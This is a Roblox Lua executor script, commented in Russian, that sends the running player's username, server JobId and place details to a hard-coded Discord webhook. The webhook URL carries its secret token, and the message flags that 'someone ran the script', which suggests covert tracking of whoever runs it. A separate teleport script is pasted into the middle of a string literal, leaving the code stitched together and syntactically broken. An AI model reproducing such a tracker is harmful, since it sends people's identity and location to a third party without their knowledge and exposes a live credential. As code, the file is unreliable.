-- URL вашего Discord вебхука
local webhookURL = "https://discord.com/api/webhooks/1363511278596919532/FHakfZsinOWInV8X0GCv6tjNUPTV5d5gbq4CuOOs8Qt6c3VcY0-y8cQztqLAmDwAKhfB"

-- Получаем сервисы
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Функция для отладки
local function debugPrint(message)
    print("[DEBUG] " .. tostring(message))
end

-- Функция для получения данных игрока, сервера, Place ID и названия плейса
local function getPlayerData()
    local player = Players.LocalPlayer
    if not player then
        debugPrint("Игрок не найден!")
        return nil
    end

    local username = player.Name
    local serverId = game.JobId
    local placeId = game.PlaceId
    local placeName = "Unknown Place"

    if serverId == "" then
        debugPrint("Это не сервер! Возможно, вы в Roblox Studio.")
        serverId = "Roblox Studio"
    end

    -- Получаем название плейса
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if success and productInfo then
        placeName = productInfo.Name
    else
        debugPrint("Не удалось получить название плейса: " .. tostring(productInfo))
    end

    return {
        username = username,
        serverId = serverId,
        placeId = placeId,
        placeName = placeName
    }
end

-- Функция для отправки сообщения в Discord
local function sendWebhookMessage()
    debugPrint("Начало отправки сообщения в Discord...")

    -- Собираем данные игрока
    local playerData = getPlayerData()
    if not playerData then
        debugPrint("Не удалось собрать данные игрока!")
        return
    end

    -- Формируем сообщение
    local message = string.format(
        "Скрипт активирован!\nНик игрока: %s\nlocal TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- Функция для отладки
local function debugPrint(message)
    print("[DEBUG] " .. tostring(message))
end

-- Параметры телепортации
local jobId = "%s\n" -- Замените на JobId целевого сервера
local placeId = 0 -- Замените на PlaceId целевой игры

-- Функция для телепортации
local function teleportToPlaceAndServer()
    debugPrint("Попытка телепортации в другой плейс и на сервер...")

    -- Проверяем, что игрок существует
    local player = Players.LocalPlayer
    if not player then
        debugPrint("Игрок не найден!")
        return
    end

    -- Проверяем, что PlaceId указан
    if placeId == 0 then
        debugPrint("PlaceId не указан! Пожалуйста, замените placeId на корректный идентификатор игры.")
        return
    end

    -- Проверяем, что JobId указан
    if jobId == "" then
        debugPrint("JobId не указан! Пожалуйста, замените jobId на корректный идентификатор сервера.")
        return
    end

    -- Выполняем телепортацию
    local success, result = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
    end)

    if success then
        debugPrint("Телепортация инициирована! Ожидайте...")
    else
        debugPrint("Ошибка при телепортации: " .. tostring(result))
    end
end

-- Вызов функции при активации скрипта
debugPrint("Скрипт запущен!")
teleportToPlaceAndServer()

-- Защита от мгновенного отключения
task.wait(5) -- Ждём 5 секунд, чтобы избежать отключения до завершения телепортации%d\nНазвание плейса: %s",
        playerData.username,
        playerData.serverId,
        playerData.placeId,
        playerData.placeName
    )

    local data = {
        ["content"] = message,
        ["username"] = "КТО-ТО ЗАПУСТИЛ СКРИПТ",
        ["avatar_url"] = "https://i.imgur.com/4Kuye6W.jpeg"
    }

    -- Проверяем доступность HttpService
    if not HttpService then
        debugPrint("HttpService недоступен!")
        return
    end

    -- Кодируем данные в JSON
    local encodedData = HttpService:JSONEncode(data)
    debugPrint("Данные закодированы: " .. encodedData)

    -- Проверяем, доступен ли http.request
    if not http or not http.request then
        debugPrint("http.request не поддерживается вашим инжектором (Xeno). Попробуем другой метод...")

        -- Пробуем использовать game:HttpPost (если поддерживается)
        local success, response = pcall(function()
            return game:HttpPost(webhookURL, encodedData, "application/json")
        end)

        if success then
            debugPrint("Сообщение успешно отправлено через game:HttpPost!")
        else
            debugPrint("Ошибка при использовании game:HttpPost: " .. tostring(response))
        end
        return
    end

    -- Используем http.request, если он доступен
    local success, response = pcall(function()
        return http.request({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encodedData
        })
    end)

    if success then
        if response.StatusCode == 204 then
            debugPrint("Сообщение успешно отправлено в Discord!")
        else
            debugPrint("Ошибка Discord: Код " .. tostring(response.StatusCode))
        end
    else
        debugPrint("Ошибка при отправке сообщения: " .. tostring(response))
    end
end

-- Вызов функции при активации скрипта
debugPrint("Скрипт запущен!")
sendWebhookMessage()
